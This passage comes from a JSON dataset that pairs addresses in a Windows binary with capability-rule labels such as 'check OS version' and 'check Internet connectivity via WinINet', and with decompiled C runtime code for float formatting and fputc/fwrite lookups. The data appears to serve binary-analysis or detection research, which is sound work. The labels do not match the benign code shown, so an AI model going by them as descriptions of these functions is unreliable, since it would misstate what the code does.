        "token_count": 737
    },
    "0040cb40": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl\nfcn.0040cb40(uchar *arg_8h, uint32_t arg_ch, int32_t arg_10h, uint arg_14h, int32_t arg_18h, int32_t *arg_1ch, \n            uint arg_20h, int32_t *arg_24h)\n\n{\n    code *pcVar1;\n    uchar *puVar2;\n    uint *puVar3;\n    uint arg_8h_00;\n    char *pcVar4;\n    int32_t iVar5;\n    uint var_114h;\n    uint32_t var_110h;\n    uint *var_10ch;\n    uint var_54h;\n    int32_t var_44h;\n    char *s2;\n    uint *var_2ch;\n    char *var_20h;\n    uchar *var_14h;\n    uint32_t var_8h;\n    uint uStack8;\n    \n    puVar3 = &fcn.0040cb40::var_54h;\n    for (iVar5 = 0x15; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar3 = 0xcccccccc;\n        puVar3 = puVar3 + 1;\n    }\n    if (arg_10h < 1) {\n        var_10ch = NULL;\n    }\n    else {\n        var_10ch = arg_10h;\n    }\n    var_110h = var_10ch + 9U < arg_ch;\n    var_8h = var_110h;\n    if ((var_110h == 0) &&\n       (iVar5 = fcn.00405830(2, L\"D:\\\\a\\\\VC-LTL5\\\\VC-LTL5\\\\Sources\\\\ucrt\\\\convert\\\\cvt.cpp\", *0x419024 + 6, 0, 0x41322c\n                             , L\"result_buffer_count > static_cast<size_t>(3 + (precision > 0 ? precision : 0) + 5 + 1)\"\n                            ),  iVar5 == 1)) {\n        pcVar1 = swi(3);\n        (*pcVar1)();\n        return;\n    }\n    if (var_8h == 0) {\n        puVar3 = sub.msvcrt.dll__errno();\n        *puVar3 = 0x22;\n        fcn.00405a50(L\"result_buffer_count > static_cast<size_t>(3 + (precision > 0 ? precision : 0) + 5 + 1)\", \n                     L\"fp_format_e_internal\", L\"D:\\\\a\\\\VC-LTL5\\\\VC-LTL5\\\\Sources\\\\ucrt\\\\convert\\\\cvt.cpp\", *0x419024 + 6\n                     , 0);\n    }\n    else {\n        if (arg_20h != '\\0') {\n            var_10ch = *arg_1ch == 0x2d;\n            var_14h = arg_8h + var_10ch;\n            var_10ch = 0 < arg_10h;\n            fcn.0040d500(arg_8h, arg_ch, var_14h, var_10ch);\n        }\n        var_20h = arg_8h;\n        if (*arg_1ch == 0x2d) {\n            *arg_8h = 0x2d;\n            var_20h = arg_8h + 1;\n        }\n        if (0 < arg_10h) {\n            *var_20h = var_20h[1];\n            if (arg_24h == NULL) {\n                var_10ch = sub.msvcrt.dll_localeconv();\n            }\n            else {\n                var_10ch = *(*arg_24h + 0xbc);\n            }\n            var_2ch = var_10ch;\n            var_20h = var_20h + 1;\n            *var_20h = **var_10ch;\n        }\n        var_10ch = arg_20h == '\\0';\n        var_20h = var_20h + var_10ch + arg_10h;\n        iVar5 = *0x419024 + 0x2c;\n        if (arg_ch == 0xffffffff) {\n            var_110h = arg_ch;\n        }\n        else {\n            var_110h = arg_ch - (var_20h - arg_8h);\n        }\n        arg_8h_00 = sub.msvcrt.dll_strcpy_s(var_20h, var_110h, \"e+000\");\n        fcn.0040da60(arg_8h_00, \n                     L\"strcpy_s( p, result_buffer_count == (static_cast<size_t>(-1)) ? result_buffer_count : result_buffer_count - (p - result_buffer), \\\"e+000\\\")\"\n                     , L\"fp_format_e_internal\", L\"D:\\\\a\\\\VC-LTL5\\\\VC-LTL5\\\\Sources\\\\ucrt\\\\convert\\\\cvt.cpp\", iVar5, 0);\n        puVar2 = var_20h;\n        s2 = var_20h + 2;\n        if (arg_14h != '\\0') {\n            *var_20h = 0x45;\n        }\n        pcVar4 = var_20h + 1;\n        if (*arg_1ch[2] != '0') {\n            var_44h = arg_1ch[1] + -1;\n            if (var_44h < 0) {\n                var_44h = -var_44h;\n                var_20h[1] = '-';\n            }\n            if (99 < var_44h) {\n                var_20h[2] = var_20h[2] + var_44h / 100;\n                var_44h = var_44h % 100;\n            }\n            if (9 < var_44h) {\n                var_20h[3] = var_20h[3] + var_44h / 10;\n                var_44h = var_44h % 10;\n            }\n            pcVar4 = var_20h + 4;\n            *pcVar4 = *pcVar4 + var_44h;\n        }\n        var_20h = pcVar4;\n        if ((arg_18h == 2) && (*s2 == '0')) {\n            sub.msvcrt.dll_memmove(s2, puVar2 + 3, 3);\n        }\n    }\n    uStack8 = 0x40ce9b;\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 1445
    },
    "0040cea0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.0040cea0(uint *arg_8h, uchar *arg_ch, int32_t arg_10h, uint arg_14h, uint arg_18h, int32_t arg_1ch, uint arg_20h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    ulong uVar3;\n    uint32_t var_f0h;\n    uint32_t var_ech;\n    int32_t var_e8h;\n    uint var_e4h;\n    uint var_30h;\n    int32_t var_1ch;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint uStack8;\n    \n    puVar2 = &fcn.0040cea0::var_30h;\n    for (iVar1 = 0xc; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0xcccccccc;\n        puVar2 = puVar2 + 1;\n    }\n    var_10h = 0;\n    var_ch = 0;\n    var_8h = 0;\n    fcn.00410790(*arg_8h, arg_8h[1], arg_1ch, &fcn.0040cea0::var_10h, arg_14h, arg_18h);\n    if (arg_10h == -1) {\n        var_e8h = arg_10h;\n    }\n    else {\n        var_ech = var_10h == 0x2d;\n        var_e8h = arg_10h - var_ech;\n    }\n    var_f0h = var_10h == 0x2d;\n    iVar1 = fcn.0040e360(arg_ch + var_f0h, var_e8h, arg_1ch + var_ch, &fcn.0040cea0::var_10h);\n    var_1ch = iVar1;\n    if (iVar1 == 0) {\n        uVar3 = fcn.0040cff0(arg_ch, arg_10h, arg_1ch, &fcn.0040cea0::var_10h, 0, arg_20h);\n        arg_ch = uVar3 >> 0x20;\n        iVar1 = uVar3;\n    }\n    else {\n        *arg_ch = 0;\n    }\n    fcn.00411450(iVar1, arg_ch);\n    uStack8 = 0x40cfcc;\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 563
    },
    "0040cff0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040cff0(uchar *arg_8h, uint arg_ch, int32_t arg_10h, int32_t *arg_14h, uint arg_18h, int32_t *arg_1ch)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint *var_100h;\n    uint var_40h;\n    int32_t n;\n    uint *var_2ch;\n    uchar *s;\n    uchar *var_14h;\n    int32_t var_8h;\n    uint uStack8;\n    \n    puVar2 = &fcn.0040cff0::var_40h;\n    for (iVar1 = 0x10; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0xcccccccc;\n        puVar2 = puVar2 + 1;\n    }\n    var_8h = arg_14h[1] + -1;\n    if ((arg_18h != '\\0') && (var_8h == arg_10h)) {\n        var_100h = *arg_14h == 0x2d;\n        var_14h = arg_8h + var_100h + var_8h;\n        *var_14h = 0x30;\n        var_14h[1] = 0;\n    }\n    s = arg_8h;\n    if (*arg_14h == 0x2d) {\n        *arg_8h = 0x2d;\n        s = arg_8h + 1;\n    }\n    if (arg_14h[1] < 1) {\n        fcn.0040d500(arg_8h, arg_ch, s, 1);\n        *s = 0x30;\n        s = s + 1;\n    }\n    else {\n        s = s + arg_14h[1];\n    }\n    if (0 < arg_10h) {\n        fcn.0040d500(arg_8h, arg_ch, s, 1);\n        if (arg_1ch == NULL) {\n            var_100h = sub.msvcrt.dll_localeconv();\n        }\n        else {\n            var_100h = *(*arg_1ch + 0xbc);\n        }\n        var_2ch = var_100h;\n        *s = **var_100h;\n        s = s + 1;\n        if (arg_14h[1] < 0) {\n            if ((arg_18h == '\\0') && (arg_10h <= -arg_14h[1])) {\n                var_100h = arg_10h;\n            }\n            else {\n                var_100h = -arg_14h[1];\n            }\n            n = var_100h;\n            fcn.0040d500(arg_8h, arg_ch, s, var_100h);\n            sub.msvcrt.dll_memset(s, 0x30, n);\n        }\n    }\n    uStack8 = 0x40d1a9;\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 688
    },
    "0040d1b0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl\nfcn.0040d1b0(uint *arg_8h, uchar *arg_ch, int32_t arg_10h, uint arg_14h, uint arg_18h, int32_t arg_1ch, uint32_t arg_20h\n            , uint arg_24h, uint arg_28h)\n\n{\n    char *pcVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    ulong uVar4;\n    uint32_t var_120h;\n    uint var_60h;\n    uint var_55h;\n    int32_t var_4ch;\n    int32_t var_40h;\n    char *var_34h;\n    int32_t var_28h;\n    uint32_t var_1ch;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint uStack8;\n    \n    puVar3 = &fcn.0040d1b0::var_60h;\n    for (iVar2 = 0x18; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0xcccccccc;\n        puVar3 = puVar3 + 1;\n    }\n    var_10h = 0;\n    var_ch = 0;\n    var_8h = 0;\n    fcn.00410790(*arg_8h, arg_8h[1], arg_1ch, &fcn.0040d1b0::var_10h, arg_14h, arg_18h);\n    var_120h = var_10h == 0x2d;\n    var_1ch = var_120h;\n    var_28h = var_ch + -1;\n    var_34h = arg_ch + var_120h;\n    if (arg_10h == -1) {\n        var_120h = arg_10h;\n    }\n    else {\n        var_120h = arg_10h - var_120h;\n    }\n    var_40h = var_120h;\n    iVar2 = fcn.0040e360(var_34h, var_120h, arg_1ch, &fcn.0040d1b0::var_10h);\n    var_4ch = iVar2;\n    if (iVar2 == 0) {\n        var_55h._0_1_ = var_28h < var_ch + -1;\n        var_28h = var_ch + -1;\n        if ((var_28h < -4) || (arg_1ch <= var_28h)) {\n            uVar4 = fcn.0040cb40(arg_ch, arg_10h, arg_1ch, arg_20h & 0xff, arg_24h, &fcn.0040d1b0::var_10h, 1, arg_28h);\n            arg_ch = uVar4 >> 0x20;\n            iVar2 = uVar4;\n        }\n        else {\n            pcVar1 = var_34h;\n            if (var_55h) {\n                do {\n                    var_34h = pcVar1;\n                    pcVar1 = var_34h + 1;\n                } while (*var_34h != '\\0');\n                var_34h[-1] = '\\0';\n                var_34h = var_34h + 1;\n            }\n            uVar4 = fcn.0040cff0(arg_ch, arg_10h, arg_1ch, &fcn.0040d1b0::var_10h, 1, arg_28h);\n            arg_ch = uVar4 >> 0x20;\n            iVar2 = uVar4;\n        }\n    }\n    else {\n        *arg_ch = 0;\n    }\n    fcn.00411450(iVar2, arg_ch);\n    uStack8 = 0x40d362;\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 885
    },
    "0040d500": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040d500(uint noname_0, uint noname_1, int32_t s2, int32_t s1)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    \n    puVar2 = &stack0xfffffffc;\n    for (iVar1 = 0; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0xcccccccc;\n        puVar2 = puVar2 + 1;\n    }\n    if (s1 != 0) {\n        iVar1 = sub.msvcrt.dll_strlen(s2);\n        sub.msvcrt.dll_memmove(s2 + s1, s2, iVar1 + 1);\n    }\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 174
    },
    "0040d5a0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl\nfcn.0040d5a0(uint arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h, int32_t arg_18h, int32_t arg_1ch, \n            uint arg_20h, uint32_t arg_24h, uint arg_28h, uint arg_2ch)\n\n{\n    code *pcVar1;\n    uint *puVar2;\n    uint32_t arg_18h_00;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint var_120h;\n    uint var_11ch;\n    uint32_t var_118h;\n    uint var_60h;\n    uint var_50h;\n    int32_t var_44h;\n    uint var_35h;\n    uint32_t var_2ch;\n    uint32_t var_20h;\n    uint32_t var_14h;\n    uint32_t var_8h;\n    uint uStack8;\n    \n    puVar2 = &fcn.0040d5a0::var_60h;\n    for (iVar4 = 0x18; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar2 = 0xcccccccc;\n        puVar2 = puVar2 + 1;\n    }\n    var_118h = arg_ch != 0;\n    var_8h = var_118h;\n    if ((var_118h == 0) &&\n       (iVar4 = fcn.00405830(2, L\"D:\\\\a\\\\VC-LTL5\\\\VC-LTL5\\\\Sources\\\\ucrt\\\\convert\\\\cvt.cpp\", *0x41902c + 1, 0, 0x41322c\n                             , L\"result_buffer != nullptr\"),  iVar4 == 1)) {\n        pcVar1 = swi(3);\n        (*pcVar1)();\n        return;\n    }\n    if (var_8h == 0) {\n        puVar2 = sub.msvcrt.dll__errno();\n        *puVar2 = 0x16;\n        fcn.00405a50(L\"result_buffer != nullptr\", L\"__acrt_fp_format\", \n                     L\"D:\\\\a\\\\VC-LTL5\\\\VC-LTL5\\\\Sources\\\\ucrt\\\\convert\\\\cvt.cpp\", *0x41902c + 1, 0);\n    }\n    else {\n        var_118h = arg_10h != 0;\n        var_14h = var_118h;\n        if ((var_118h == 0) &&\n           (iVar4 = fcn.00405830(2, L\"D:\\\\a\\\\VC-LTL5\\\\VC-LTL5\\\\Sources\\\\ucrt\\\\convert\\\\cvt.cpp\", *0x41902c + 2, 0, \n                                 0x41322c, L\"result_buffer_count > 0\"),  iVar4 == 1)) {\n            pcVar1 = swi(3);\n            (*pcVar1)();\n            return;\n        }\n        if (var_14h == 0) {\n            puVar2 = sub.msvcrt.dll__errno();\n            *puVar2 = 0x16;\n            fcn.00405a50(L\"result_buffer_count > 0\", L\"__acrt_fp_format\", \n                         L\"D:\\\\a\\\\VC-LTL5\\\\VC-LTL5\\\\Sources\\\\ucrt\\\\convert\\\\cvt.cpp\", *0x41902c + 2, 0);\n        }\n        else {\n            var_118h = arg_14h != 0;\n            var_20h = var_118h;\n            if ((var_118h == 0) &&\n               (iVar4 = fcn.00405830(2, L\"D:\\\\a\\\\VC-LTL5\\\\VC-LTL5\\\\Sources\\\\ucrt\\\\convert\\\\cvt.cpp\", *0x41902c + 3, 0, \n                                     0x41322c, L\"scratch_buffer != nullptr\"),  iVar4 == 1)) {\n                pcVar1 = swi(3);\n                (*pcVar1)();\n                return;\n            }\n            if (var_20h == 0) {\n                puVar2 = sub.msvcrt.dll__errno();\n                *puVar2 = 0x16;\n                fcn.00405a50(L\"scratch_buffer != nullptr\", L\"__acrt_fp_format\", \n                             L\"D:\\\\a\\\\VC-LTL5\\\\VC-LTL5\\\\Sources\\\\ucrt\\\\convert\\\\cvt.cpp\", *0x41902c + 3, 0);\n            }\n            else {\n                var_118h = arg_18h != 0;\n                var_2ch = var_118h;\n                if ((var_118h == 0) &&\n                   (iVar4 = fcn.00405830(2, L\"D:\\\\a\\\\VC-LTL5\\\\VC-LTL5\\\\Sources\\\\ucrt\\\\convert\\\\cvt.cpp\", *0x41902c + 4, \n                                         0, 0x41322c, L\"scratch_buffer_count > 0\"),  iVar4 == 1)) {\n                    pcVar1 = swi(3);\n                    (*pcVar1)();\n                    return;\n                }\n                if (var_2ch == 0) {\n                    puVar2 = sub.msvcrt.dll__errno();\n                    *puVar2 = 0x16;\n                    fcn.00405a50(L\"scratch_buffer_count > 0\", L\"__acrt_fp_format\", \n                                 L\"D:\\\\a\\\\VC-LTL5\\\\VC-LTL5\\\\Sources\\\\ucrt\\\\convert\\\\cvt.cpp\", *0x41902c + 4, 0);\n                }\n                else {\n                    if ((((arg_1ch == 0x41) || (arg_1ch == 0x45)) || (arg_1ch == 0x46)) || (arg_1ch == 0x47)) {\n                        var_118h._3_1_ = 1;\n                    }\n                    else {\n                        var_118h._3_1_ = 0;\n                    }\n                    var_35h._0_1_ = var_118h._3_1_;\n                    if (((arg_24h & 8) == 0) && (var_44h = fcn.0040bfe0(arg_8h),  var_44h != 0)) {\n                        arg_18h_00 = var_35h;\n                        uVar3 = fcn.0040c160(arg_8h);\n                        fcn.0040d390(var_44h, uVar3 & 0xff, arg_ch, arg_10h, arg_18h_00);\n                    }\n                    else {\n                        if ((arg_24h & 0x10) == 0) {\n                            var_120h = 2;\n                        }\n                        else {\n                            var_120h = 3;\n                        }\n                        var_50h = var_120h;\n                        if (0x26 < arg_1ch - 0x41U) {\ncode_r0x0040d9a9:\n                            iVar4 = fcn.00405830(2, L\"D:\\\\a\\\\VC-LTL5\\\\VC-LTL5\\\\Sources\\\\ucrt\\\\convert\\\\cvt.cpp\", \n                                                 *0x41902c + 0x2b, 0, 0x41322c, L\"(\\\"Unsupported format specifier\\\", 0)\"\n                                                );\n                            if (iVar4 == 1) {\n                                pcVar1 = swi(3);\n                                (*pcVar1)();\n                                return;\n                            }\n                            goto code_r0x0040d9d4;\n                        }\n    // switch table (39 cases) at 0x40da18\n                        switch(*(*(arg_1ch + 0x40d9eb) * 4 + 0x40da18)) {\n                        case 0x40d91b:\n                            fcn.0040c1f0(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, arg_20h, var_35h, var_120h, arg_2ch)\n                            ;\n                            break;\n                        case 0x40d94d:\n                            fcn.0040c970(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, arg_20h, var_35h, var_120h, arg_2ch)\n                            ;\n                            break;\n                        case 0x40d97f:\n                            fcn.0040cea0(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, arg_20h, arg_2ch);\n                            break;\n                        case 0x40d9a5:\n                            goto code_r0x0040d9a9;\n                        case 0x40d9d4:\ncode_r0x0040d9d4:\n                            fcn.0040d1b0(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, arg_20h, var_35h, var_50h, arg_2ch);\n                        }\n                    }\n                }\n            }\n        }\n    }\n    uStack8 = 0x40da11;\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 2067
    },
    "0040da60": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040da60(int32_t arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    \n    puVar2 = &stack0xfffffffc;\n    for (iVar1 = 0; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0xcccccccc;\n        puVar2 = puVar2 + 1;\n    }\n    if (arg_8h != 0) {\n        fcn.00405b70(arg_ch, arg_10h, arg_14h, arg_18h, arg_1ch);\n    }\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 183
    },
    "0040dac0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040dac0(uint arg_8h, uint arg_ch)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    code *var_dch;\n    uint var_1ch;\n    code *var_14h;\n    code *var_8h;\n    uint uStack8;\n    \n    puVar3 = &fcn.0040dac0::var_1ch;\n    for (iVar2 = 7; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0xcccccccc;\n        puVar3 = puVar3 + 1;\n    }\n    if (*0x419594 == NULL) {\n        uVar1 = fcn.0040e020(\"fputc\");\n        (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1);\n        var_8h = fcn.004114b0();\n        var_dch = var_8h;\n        if (var_8h == NULL) {\n            var_dch = 0xffffffff;\n        }\n        *0x419594 = var_dch;\n    }\n    if (*0x419594 == 0xffffffff) {\n        var_dch = NULL;\n    }\n    else {\n        var_dch = *0x419594;\n    }\n    var_14h = var_dch;\n    if (var_dch != NULL) {\n        (*var_dch)(arg_8h, arg_ch);\n        fcn.004114b0();\n    }\n    uStack8 = 0x40db8f;\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 359
    },
    "0040dba0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040dba0(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    code *var_dch;\n    uint var_1ch;\n    code *var_14h;\n    code *var_8h;\n    uint uStack8;\n    \n    puVar3 = &fcn.0040dba0::var_1ch;\n    for (iVar2 = 7; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0xcccccccc;\n        puVar3 = puVar3 + 1;\n    }\n    if (*0x41959c == NULL) {\n        uVar1 = fcn.0040e020(\"fwrite\");\n        (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1);\n        var_8h = fcn.004114b0();\n        var_dch = var_8h;\n        if (var_8h == NULL) {\n            var_dch = 0xffffffff;\n        }\n        *0x41959c = var_dch;\n    }\n    if (*0x41959c == 0xffffffff) {\n        var_dch = NULL;\n    }\n    else {\n        var_dch = *0x41959c;\n    }\n    var_14h = var_dch;\n    if (var_dch != NULL) {\n        (*var_dch)(arg_8h, arg_ch, arg_10h, arg_14h);\n        fcn.004114b0();\n    }\n    uStack8 = 0x40dc76;\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 383
    },
    "0040dc80": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0040dc80(uint32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint32_t var_100h;\n    uint var_40h;\n    int32_t var_38h;\n    uint var_29h;\n    uint32_t var_20h;\n    uchar *var_14h;\n    char *var_8h;\n    uint uStack8;\n    \n    puVar2 = &fcn.0040dc80::var_40h;\n    for (iVar1 = 0x10; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0xcccccccc;\n        puVar2 = puVar2 + 1;\n    }\n    if (((arg_8h & 0x80) == 0) ||\n       ((arg_ch != _sym.imp.msvcrt.dll__iob + 0x20 && (arg_ch != _sym.imp.msvcrt.dll__iob + 0x40)))) {\n        fcn.0040dac0(arg_8h, arg_ch);\n    }\n    else {\n        fcn.00405c60(arg_ch);\n        if (arg_ch == _sym.imp.msvcrt.dll__iob + 0x20) {\n            var_8h = 0x4195a0;\n            var_14h = 0x4195a4;\n        }\n        else {\n            var_8h = 0x4195a1;\n            var_14h = 0x4195a8;\n        }\n        if (*var_8h == '\\0') {\n            iVar1 = sub.msvcrt.dll___pctype_func();\n            if ((*(iVar1 + (arg_8h & 0xff) * 2) & 0x8000) == 0) {\n                var_20h = fcn.0040dac0(arg_8h, arg_ch);\n            }\n            else {\n                *var_8h = '\\x01';\n                *var_14h = arg_8h;\n                var_20h = arg_8h;\n            }\n        }\n        else {\n            var_14h[1] = arg_8h;\n            var_29h._0_1_ = fcn.0040de50(arg_ch);\n            var_38h = fcn.0040dba0(var_14h, 1, 2, arg_ch);\n            fcn.0040df90(var_29h, arg_ch);\n            *var_8h = '\\0';\n            if (var_38h == 0) {\n                var_100h = 0xffffffff;\n            }\n            else {\n                var_100h = arg_8h;\n            }\n            var_20h = var_100h;\n        }\n        fcn.00405ce0(arg_ch);\n    }\n    uStack8 = 0x40de05;\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 668
    },
    "0040de50": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040de50(int32_t **arg_8h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint var_18h;\n    int32_t *var_14h;\n    int32_t **var_8h;\n    uint uStack8;\n    \n    puVar3 = &fcn.0040de50::var_18h;\n    for (iVar2 = 6; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0xcccccccc;\n        puVar3 = puVar3 + 1;\n    }\n    uVar1 = sub.msvcrt.dll__fileno(arg_8h);\n    iVar2 = sub.msvcrt.dll__isatty(uVar1);\n    if (iVar2 != 0) {\n        if (arg_8h == _sym.imp.msvcrt.dll__iob + 0x20) {\n            var_8h = 0x4195b0;\n        }\n        else {\n            if (arg_8h != _sym.imp.msvcrt.dll__iob + 0x40) goto code_r0x0040df70;\n            var_8h = 0x4195b4;\n        }\n        if ((arg_8h[3] & 0x10c) == 0) {\n            arg_8h[3] = arg_8h[3] | 0x1102;\n            if (*var_8h == NULL) {\n                var_14h = sub.msvcrt.dll_malloc(0x1000);\n                if (var_14h == NULL) {\n                    arg_8h[2] = arg_8h + 5;\n                    *arg_8h = arg_8h + 5;\n                    arg_8h[1] = 0x2;\n                    arg_8h[6] = 0x2;\n                    goto code_r0x0040df70;\n                }\n                *var_8h = var_14h;\n            }\n            arg_8h[2] = *var_8h;\n            *arg_8h = *var_8h;\n            arg_8h[1] = 0x1000;\n            arg_8h[6] = 0x1000;\n        }\n    }\ncode_r0x0040df70:\n    uStack8 = 0x40df80;\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 550
    },
    "0040e020": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0040e020(void)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    int32_t var_d0h;\n    uint var_10h;\n    int32_t var_8h;\n    uint uStack8;\n    \n    puVar2 = &fcn.0040e020::var_10h;\n    for (iVar1 = 4; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0xcccccccc;\n        puVar2 = puVar2 + 1;\n    }\n    if (*0x4195b8 == 0) {\n        (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(0x414aa0);\n        var_8h = fcn.004114b0();\n        var_d0h = var_8h;\n        if (var_8h == 0) {\n            var_d0h = -1;\n        }\n        *0x4195b8 = var_d0h;\n    }\n    uStack8 = 0x40e0ab;\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 251
    },
    "0040e150": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
